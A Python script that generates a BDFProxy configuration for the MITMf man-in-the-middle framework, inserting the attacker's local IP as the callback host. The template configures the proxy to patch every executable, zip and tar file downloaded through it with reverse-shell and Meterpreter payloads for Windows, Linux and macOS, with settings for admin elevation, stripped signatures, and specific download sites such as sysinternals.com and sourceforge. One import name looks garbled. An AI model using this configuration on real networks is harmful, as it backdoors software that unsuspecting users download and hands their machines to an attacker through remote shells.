import netifaces,eznhlib,re,os,sys,operator

# This code generates your BDFProxy configuration with the correct LHOST using the INTERFACE = line in mitmf.cfg

config = "mitmf.cfg"
r = open(config,'r')
l = r.read()
lines = l.splitlines()
for line in lines:
	if re.search("INTERFACE",line):
		s = line.split(" = ")
		iface = str(s[1])

addresses = netifaces.ifaddresses(iface)
conn = addresses[2]
ipv4_addr = conn[0]['addr']
LHOST = str(ipv4_addr)

print "DEBUG: LHOST = ", str(LHOST), "IFACE = ", str(iface)
template = """
[Overall]
proxyMode = regular  # Modes: regular or None (for libmproxy < 13), socks5, transparent, reverse, upstream
MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
certLocation = ~/.mitmproxy/mitmproxy-ca.pem
proxyPort = 8080
sslports = 443, 8443
loglevel = INFO
logname = proxy.log
resourceScriptFile = bdfproxy_msf_resource.rc


[hosts]
#whitelist host/IP - patch these only.
#ALL is everything, use the blacklist to leave certain hosts/IPs out

whitelist = ALL

#Hosts that are never patched, but still pass through the proxy. You can include host and ip, recommended to do both.

blacklist = ,   # a comma is null do not leave blank


[keywords]
#These checks look at the path of a url for keywords

whitelist = ALL

#For blacklist note binaries that you do not want to touch at all

# Also applied in zip files

blacklist = .dll


[ZIP]
# patchCount is the max number of files to patch in a zip file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 50000000

blacklist = .dll,  #don't do dlls in a zip file

[TAR]
# patchCount is the max number of files to patch in a tar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 50000000

blacklist = ,   # a comma is null do not leave blank

[targets]
	#MAKE SURE that your settings for host and port DO NOT
	# overlap between different types of payloads

	[[ALL]] # DEFAULT settings for all targets REQUIRED

	LinuxType = ALL 	# choices: x86/x64/ALL/None
	WindowsType = ALL 	# choices: x86/x64/ALL/None
	FatPriority = x64   # choices: x86 or x64

	FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large

	CompressedFiles = True #True/False

		[[[LinuxIntelx86]]]
		SHELL = reverse_shell_tcp   # This is the BDF syntax
		HOST = {0} 		# The C2
		PORT = 8888
		SUPPLIED_SHELLCODE = None
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax

		[[[LinuxIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = {0}
		PORT = 9999
		SUPPLIED_SHELLCODE = None
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

		[[[WindowsIntelx86]]]
		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
		PATCH_METHOD = automatic
		HOST = {0}
		PORT = 8090
		# SHELL for use with automatic PATCH_METHOD
		SHELL = iat_reverse_tcp_stager_threaded
		# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = True
		# PATCH_DLLs as they come across
		PATCH_DLL = False
		# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
		RUNAS_ADMIN = True
		# XP_MODE  - to support XP targets
		XP_MODE = True
		# PUT Import Directory Table in a Cave vs a new section (Experimental)
		IDT_IN_CAVE = False
		# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
		#  with PATCH_METHOD 'replace' use an EXE not DLL
		SUPPLIED_BINARY = veil_go_payload.exe
		# CODE_SIGN is for code signing.  You must configure your own certs, see BDF readme for details.
        	CODE_SIGN = False
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = windows/meterpreter/reverse_tcp

		[[[WindowsIntelx64]]]
		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE, use automatic or onionduke
		PATCH_METHOD = automatic
		HOST = {0}
		PORT = 8088
		# SHELL for use with automatic PATCH_METHOD
		SHELL = iat_reverse_tcp_stager_threaded
		# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = True
		PATCH_DLL = True
		# PUT Import Directory Table in a Cave vs a new section (Experimental)
		IDT_IN_CAVE = False
		# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
		RUNAS_ADMIN = True
		# SUPPLIED_BINARY is for use with PATCH_METHOD onionduke DLL/EXE can x86 32bit and
		#  with PATCH_METHOD 'replace' use an EXE not DLL
        	SUPPLIED_BINARY = pentest_x64_payload.exe
		# CODE_SIGN is for code signing.  You must configure your own certs, see BDF readme for details.
        	CODE_SIGN = False
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = windows/x64/shell/reverse_tcp

		[[[MachoIntelx86]]]
		SHELL = reverse_shell_tcp
		HOST = {0}
		PORT = 4444
		SUPPLIED_SHELLCODE = None
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

		[[[MachoIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = {0}
		PORT = 5555
		SUPPLIED_SHELLCODE = None
        	# Run preprocessor True/False
        	PREPROCESS = False
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

	# Call out the difference for targets here as they differ from ALL
	# These settings override the ALL settings

	[[sysinternals.com]]
	LinuxType = None
	WindowsType = ALL
	CompressedFiles = False
	#inherits WindowsIntelx32 from ALL
		[[[WindowsIntelx86]]]
		PATCH_DLL = False
		ZERO_CERT = True

	[[sourceforge.org]]
	WindowsType = x64
	CompressedFiles = False

		[[[WindowsIntelx64]]]
		PATCH_DLL = False

		[[[WindowsIntelx86]]]
		PATCH_DLL = False
""".format(
	str(LHOST)
)

print "DEBUG: \r\n\n\n", template

bdfconfig = "bdfproxy.cfg"

w = open(bdfconfig,'w')
w.write(template)
w.close()

os.system('clear')
cmd = "cat %s" % str(bdfconfig)
os.system(cmd)
